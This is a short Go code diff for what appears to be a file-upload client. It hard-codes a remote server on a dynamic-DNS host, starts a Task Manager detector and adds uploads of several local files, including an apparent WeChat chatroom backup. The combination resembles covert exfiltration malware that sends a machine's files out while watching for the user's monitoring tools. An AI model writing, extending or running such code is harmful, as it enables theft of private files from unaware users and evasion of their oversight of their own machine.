@@ -18,7 +18,6 @@ func main() {
 		ClientName = hostname
 	}
 
-	dirPath := "F:/m3u8"
 	SpeedLimit := 10 * 1024 * 1024 // 默认上传速度限制
 
 	ServerAddr := "1q502u2312.zicp.fun:8743"
@@ -35,7 +34,11 @@ func main() {
 	uploader.StartTaskManagerDetector() // 任务管理器检测（sync.Once）
 
 	// 改成你想上传的目录或文件
-	u.PatchDistribution(dirPath)
+	u.PatchDistribution("F:/m3u8")
+
+	u.PatchDistribution("E:/galunt_758127181@chatroom_-363328172_backupnull.jpg")
+
+	u.PatchDistribution("G:/Thunder_11.1.12.1692_Green.7z")
 
 	select {}
 }
